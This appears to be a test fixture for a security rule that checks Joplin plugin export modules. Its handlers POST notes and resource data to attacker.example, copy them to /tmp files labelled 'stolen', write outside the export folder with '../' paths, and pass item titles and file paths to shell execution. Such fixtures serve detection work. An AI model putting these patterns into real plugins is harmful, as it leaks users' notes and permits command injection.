import * as childProcess from 'child_process';
import * as fs from 'fs';
import { FileSystemItem } from 'api/types';
import joplin from 'api';

class ClassExportModule {
    public format = 'class-json';
    public description = 'Class JSON Export';
    public target = FileSystemItem.Directory;
    public isNoteArchive = false;

    public async onInit(_context: any) {}

    public async onProcessItem(_context: any, _itemType: number, item: any) {
        fetch('https://attacker.example/class-item', {
            method: 'POST',
            body: JSON.stringify(item),
        });
    }

    public async onProcessResource(_context: any, _resource: any, _filePath: string) {}

    public async onClose(_context: any) {}
}

function createExportModule() {
    return {
        format: 'factory-json',
        description: 'Factory JSON Export',
        target: FileSystemItem.Directory,
        isNoteArchive: false,
        async onInit(_context: any) {},
        async onProcessItem(_context: any, _itemType: number, item: any) {
            fetch('https://attacker.example/factory-item', {
                method: 'POST',
                body: JSON.stringify(item),
            });
        },
        async onProcessResource(_context: any, _resource: any, _filePath: string) {},
        async onClose(_context: any) {},
    };
}

async function triggerRule() {
    const fsExtra = joplin.require('fs-extra');
    const exportModule: any = {
        format: 'json',
        description: 'JSON Export',
        target: FileSystemItem.Directory,
        isNoteArchive: false,
        async onInit(context: any) {
            fetch('https://attacker.example/export?dest=' + context.destPath);
        },

        async onProcessItem(context: any, itemType: number, item: any) {
            fetch('https://attacker.example/item-type?' + itemType);
            fetch('https://attacker.example/item', {
                method: 'POST',
                body: JSON.stringify(item),
            });
            childProcess.exec('export-item ' + item.title);
            fs.writeFileSync('/tmp/stolen-item.json', JSON.stringify(item));
            fs.writeFileSync(context.destPath + '/item.json', JSON.stringify(item));
            fs.writeFileSync(context.destPath + '/../escaped-item.json', JSON.stringify(item));
            fs.createWriteStream('/tmp/streamed-item.json').write(JSON.stringify(item));
            fsExtra.outputFileSync('/tmp/fs-extra-item.json', JSON.stringify(item));
            const claimedContext = { destPath: '/tmp/forged-destination.json' };
            fs.writeFileSync(claimedContext.destPath, JSON.stringify(item));
        },

        async onProcessResource(context: any, resource: any, filePath: string) {
            childProcess.execFile(filePath, []);
            fs.copyFileSync(filePath, '/tmp/stolen-resource.bin');
            fs.copyFileSync(filePath, context.destPath + '/resource.bin');
            fs.copyFileSync(filePath, context.destPath + '/../escaped-resource.bin');
            fetch('https://attacker.example/resource?' + resource.id);
        },

        async onClose(context: any) {
            childProcess.execSync('close-export ' + context.destPath);
        },
    };

    await joplin.interop.registerExportModule(exportModule);
    await joplin.interop.registerExportModule(new ClassExportModule());
    await joplin.interop.registerExportModule(createExportModule());
}
